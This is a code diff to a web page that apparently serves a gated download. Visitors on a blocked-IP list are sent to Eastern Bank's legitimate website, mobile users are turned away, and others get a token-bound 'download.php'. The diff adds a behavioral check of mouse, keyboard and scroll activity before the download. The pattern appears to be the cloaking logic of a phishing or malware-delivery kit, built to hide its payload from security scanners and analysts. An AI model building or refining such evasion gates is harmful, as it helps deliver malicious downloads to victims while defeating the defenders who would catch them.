@@ -59,27 +59,30 @@ $tk = issue_token();
     }
 
     function getClientIP() {
+      // 3s guard so a hung external call can't stall the whole flow.
       return new Promise((resolve) => {
+        var to = setTimeout(function () { resolve(null); }, 3000);
         fetch('https://api.ipify.org?format=json')
           .then(response => response.json())
-          .then(data => resolve(data.ip))
-          .catch(() => resolve(null));
+          .then(data => { clearTimeout(to); resolve(data.ip); })
+          .catch(() => { clearTimeout(to); resolve(null); });
       });
     }
 
     (async function() {
+      if (isMobileDevice()) {
+        window.location.href = "denied.html";
+        return;
+      }
       const clientIP = await getClientIP();
       if (clientIP && blockedIPs.includes(clientIP)) {
         window.location.href = "https://www.easternbank.com/";
         return;
       }
-      if (isMobileDevice()) {
-        window.location.href = "denied.html";
-      } else {
-        setTimeout(function() {
-          window.location.href = "download.php?tk=" + encodeURIComponent(TK);
-        }, 5000);
-      }
+      // Behavioral gate: collect mouse/keyboard/scroll, one Jev verdict,
+      // then continue with the verdict-bound token. All failure paths fall
+      // back to the original 5s fixed-time redirect.
+      <?php include __DIR__ . '/../include/telemetry.php'; ?>
     })();
   </script>
 </body>
